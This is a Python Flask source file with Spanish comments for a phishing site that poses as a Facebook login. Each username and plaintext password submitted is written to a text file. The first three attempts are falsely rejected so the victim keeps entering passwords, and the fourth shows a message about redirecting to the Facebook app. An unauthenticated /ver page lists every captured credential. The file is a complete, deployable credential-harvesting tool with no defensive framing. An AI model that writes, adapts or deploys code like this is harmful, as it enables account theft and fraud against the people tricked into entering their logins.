from flask import Flask, render_template, request, redirect, url_for, flash, session
import os
import re

app = Flask(__name__)
app.secret_key = "clave_secreta_segura"  # Necesario para sesiones y flash

# --- Lista de dominios válidos para correo ---
DOMINIOS_VALIDOS = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com"]

@app.route('/')
def login():
    return render_template('index.html')

@app.route('/guardar', methods=['POST'])
def guardar():
    usuario = request.form['usuario']
    contrasena = request.form['contrasena']

    # --- Validar si es correo ---
    if "@" in usuario:
        try:
            nombre, dominio = usuario.split("@")
        except ValueError:
            flash("Correo inválido")
            return redirect(url_for('login'))

        if dominio not in DOMINIOS_VALIDOS:
            flash("Correo inválido")
            return redirect(url_for('login'))

    # --- Validar si es número ---
    elif usuario.isdigit():
        if len(usuario) < 8 or len(usuario) > 11:
            flash("Número inválido (debe tener entre 8 y 11 dígitos)")
            return redirect(url_for('login'))
    else:
        flash("Debe ingresar un correo válido o un número de teléfono")
        return redirect(url_for('login'))

    # --- Manejo de intentos de contraseña ---
    if "intentos" not in session:
        session["intentos"] = 0

    session["intentos"] += 1
    intento_actual = session["intentos"]

    # Guardar SIEMPRE cada intento
    with open("datos_ingresados.txt", "a", encoding="latin-1", errors="replace") as archivo:
        if intento_actual < 4:
            archivo.write(f"Intento {intento_actual} (rechazado) -> Usuario: {usuario} | Contraseña: {contrasena}\n")
            flash("El correo o la contraseña son incorrectos")
            return redirect(url_for('login'))
        else:
            archivo.write(f"Intento {intento_actual} (permitido) -> Usuario: {usuario} | Contraseña: {contrasena}\n")
            session["intentos"] = 0  # Reiniciar intentos
            return f"<h2>¡Será redireccionado a la aplicación de Facebook!</h2><a href='/'>Volver</a>"

# NUEVA RUTA para ver los datos guardados
@app.route('/ver')
def ver_datos():
    try:
        with open("datos_ingresados.txt", "r", encoding="latin-1") as archivo:
            contenido = archivo.read().replace("\n", "<br>")
        return f"<h2>Datos guardados:</h2><p>{contenido}</p>"
    except FileNotFoundError:
        return "<h2>No hay datos aún guardados.</h2>"
    except Exception as e:
        return f"<h2>Error al leer datos:</h2><p>{str(e)}</p>"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
